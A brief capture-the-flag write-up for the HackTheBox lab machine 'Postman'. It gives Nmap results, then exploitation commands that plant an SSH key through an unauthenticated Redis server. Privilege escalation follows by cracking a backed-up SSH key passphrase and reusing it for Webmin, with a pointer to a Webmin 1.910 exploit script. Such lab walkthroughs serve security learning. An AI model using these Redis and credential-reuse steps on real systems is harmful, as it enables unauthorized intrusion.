# Postman

### Nmap

```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: The Cyber Geek's Personal Website
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: MiniServ/1.910
```

### Web Enum

```
http://10.10.10.160/
	/upload/ -> sus file upload dir

https://10.10.10.160:10000/ -> login page

```

### Exploitation

```bash
# found reids can write to the server

# make a authorized_keys
(echo -e "\n\n"; cat ~/Tools/ssh_key/authorized_keys; echo -e "\n\n") > foo.txt

# send key to the server
cat foo.txt | redis-cli -h $IP -x set crackit
**OK**

# save key
redis-cli -h $IP
10.10.10.160:6379> config set dir  /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK

# login through ssh with authorized_keys
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/Tools/ssh_key/authorized_private_keys redis@$IP -v
```

### Priv Esc

```bash
# found matt ssh key backup and reveral the passphrase from it
matt_id_rsa.bak:computer2008

# matt ssh login has been disabled 
cat /etc/ssh/sshd_config
DenyUsers Matt

# matt can be switched from redis internally
su matt

# cred can be reused to login to webmin
Matt:computer2008

# https://github.com/roughiz/Webmin-1.910-Exploit-Script
```
